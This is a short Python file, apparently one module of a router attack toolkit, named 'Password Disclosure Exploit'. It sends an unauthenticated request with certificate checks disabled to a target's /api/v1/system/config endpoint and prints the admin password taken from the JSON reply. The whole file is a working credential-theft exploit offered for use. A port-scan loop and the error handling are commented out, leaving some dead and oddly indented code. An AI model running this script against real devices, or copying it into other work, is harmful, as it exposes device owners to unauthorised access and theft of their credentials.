import scanners.open_ports as port_scan

# Password Disclosure Exploit
def exploit(target):
    print("Password Disclosure Exploit")
    print("Target: " + target)
    print()
    print("Running Payload...")
    print()
    getPassword(target)

def getPassword(target):
    import requests
    import json
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # ports = []
    # scan for open ports
    # ports = port_scan.scanForOpenPorts(target)

    #for port in ports:
		# try to get the password from the router

		#try:
    url = "https://" + target + ":" + str(443) + "/api/v1/system/config"
    response = requests.get(url, verify=False)
    if response.status_code == 200:
        print("Payload Successful!")
        print()
        print("Password: " + json.loads(response.text)["password"])
        #print("Port: " + str(443))
    else:
        print("Payload Failed!")
        print()
        print("Reason: " + response.reason)
        print("Text: " + response.text)
        print("Headers: " + str(response.headers))
        print("Cookies: " + str(response.cookies))
        print("Elapsed: " + str(response.elapsed))
        print("URL: " + str(response.url))
        print("History: " + str(response.history))
        print("Encoding: " + str(response.encoding))
        print("Reason: " + str(response.reason))
        print("Status Code: " + str(response.status_code))
        #print("Port: " + str(443))
        print()
        # except requests.exceptions.ConnectionError:
        #     print("Connection Error")
        #     print()
        # except requests.exceptions.Timeout:
        #     print("Timeout Error")
        #     print()
        # except requests.exceptions.TooManyRedirects:
        #     print("Too Many Redirects")
        #     print()
        # except requests.exceptions.RequestException as e:
        #     print("Request Exception")
        #     print()
        #     print(e)
        #     print()
        # except requests.exceptions.HTTPError as e:
        #     print("HTTP Error")
        #     print()
        #     print(e)
        #     print()
        # except requests.exceptions.URLRequired as e:
        #     print("URL Required")
        #     print()
        #     print(e)
        #     print()